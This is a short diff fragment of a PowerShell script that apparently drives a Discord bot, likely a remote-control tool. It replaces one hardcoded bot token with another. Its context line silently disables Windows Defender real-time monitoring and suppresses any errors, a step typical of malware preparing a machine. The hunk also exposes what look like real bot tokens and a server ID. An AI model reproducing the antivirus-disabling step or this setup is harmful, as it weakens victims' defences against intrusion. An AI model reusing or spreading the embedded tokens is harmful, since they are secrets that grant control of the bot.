@@ -3,7 +3,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
 #your bot token goes here
 #EXAMPLE: $token = "MTA0ODE4MjEwMTA1MTQ2MDM3.AJif8F.9Uod-6ND1QAO38pwPJ7Ishvu5Eb"
-$token = "MTM4OTQxMDY4MTg5NTM4NzIyNg.GZ7CeJ.tocoxinPj5GDbbbkdb9JqQFL5rWwJqXtOGuPuU"
+$token = "MTM4OTQxMDY4MTg5NTIyNg.G202hH.sZY-kHuoFE8O04-j7Adip-O3cWwhJ9SU297Paw"
 
 #your server id goes here
 #example: $guildId = "1199929856564584245"
